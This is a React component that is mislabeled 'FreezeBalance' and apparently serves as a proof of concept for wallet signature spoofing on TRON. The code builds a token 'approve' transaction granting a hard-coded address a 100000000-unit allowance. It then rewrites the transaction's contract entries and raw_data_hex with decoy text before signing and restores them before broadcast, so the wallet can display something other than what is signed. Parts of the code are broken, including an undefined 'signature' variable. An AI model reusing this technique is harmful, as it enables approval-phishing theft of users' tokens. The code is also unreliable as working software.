import { Button, message } from 'antd';
import { useState } from 'react';

function FreezeBalance() {
  const [msg, setMsg] = useState('');
  const [loading, setLoading] = useState(false);
  return (
    <div>
      <Button
        loading={loading}
        onClick={async () => {
          const tronWeb = window.tronWeb;
          try {
            message.info('Starting request...');
            setLoading(true);

            var parameter = [
              { type: 'address', value: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax' },
              { type: 'uint256', value: 100000000 },
            ];
            var tx =
              await window.tronWeb.transactionBuilder.triggerSmartContract(
                'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
                'approve(address,uint256)',
                {},
                parameter,
                'TKMBdaT5E5e4X3qtff3aY2ain5pG5WNPL2',
              );
            const data =
              tx.transaction.raw_data.contract[0].parameter.value.data;
            const type = tx.transaction.raw_data.contract[0].type;
            const contract1 = tx.transaction.raw_data.contract[1];
            const new_contract1 = tx.transaction.raw_data.contract[0];
            tx.transaction.raw_data.contract[1] = new_contract1;
            tx.transaction.raw_data.contract[1].parameter.value.data = '～';
            tx.transaction.raw_data.contract[1].type = 'Display test';
            tx.transaction.raw_data_hex = 'Actual content to sign';
            var signedTx = await window.tronWeb.trx.sign(tx.transaction);
            signedTx.raw_data.contract[1] = contract1;
            signedTx.raw_data.contract[0].parameter.value.data = 'test';
            signedTx.raw_data.contract[0].type = type;
            const bTx = await window.tronWeb.trx.sendRawTransaction(signedTx);

            setMsg(signature);
            setLoading(false);
          } catch (e) {
            console.log('>>>>>>>>e', e);
            setMsg(e.message);
            setLoading(false);
          }
        }}
      >
        Multi Action:{msg}
      </Button>
    </div>
  );
}

export default FreezeBalance;
